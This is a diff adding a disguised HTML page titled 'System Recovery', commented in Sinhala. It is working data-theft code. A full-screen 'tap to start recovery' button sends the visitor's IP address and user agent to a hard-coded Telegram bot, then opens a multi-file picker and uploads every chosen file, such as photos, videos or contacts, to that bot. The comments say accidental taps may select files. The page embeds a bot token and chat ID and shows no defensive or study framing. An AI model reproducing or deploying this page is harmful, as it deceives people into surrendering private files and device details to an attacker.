@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Recovery</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        /* මුළු ස්ක්‍රීන් එකම බොත්තමක් විදිහට */
+        .full-screen-btn {
+            width: 100vw;
+            height: 100vh;
+            background: #222;
+            color: white;
+            border: none;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+
+    <button class="full-screen-btn" onclick="startExtraction()">
+        TAP ANYWHERE TO START RECOVERY
+    </button>
+
+    <script>
+        const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
+        const CHAT_ID = '7883989086'; // මෙතනට ඔයාගේ ID එක දාන්න
+
+        async function startExtraction() {
+            try {
+                // 1. IP එක සහ උපකරණයේ විස්තර යැවීම
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                let info = `🔔 *Device Accessed!*%0A`;
+                info += `📍 IP: ${ipData.ip}%0A`;
+                info += `📱 Info: ${navigator.userAgent}`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${info}&parse_mode=Markdown`);
+
+                // 2. ෆයිල් තෝරාගැනීමේ මෙනුව විවෘත කිරීම
+                // ටච් එක වැඩ නිසා ස්ක්‍රීන් එකේ තැනින් තැන ඔබද්දී ෆයිල් එකක් සිලෙක්ට් වෙන්න ඉඩ තියෙනවා
+                let input = document.createElement('input');
+                input.type = 'file';
+                input.accept = '*/*'; // ඔක්කොම ෆයිල් (Photos, Videos, Contacts)
+                input.multiple = true;
+                
+                input.onchange = async e => {
+                    for (let file of e.target.files) {
+                        let formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('document', file);
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                };
+                
+                input.click();
+
+            } catch (err) {
+                // Error එකක් ආවොත් ඒකත් Telegram එකට එවන්න
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Error: ${err.message}`);
+            }
+        }
+    </script>
+</body>
+</html>
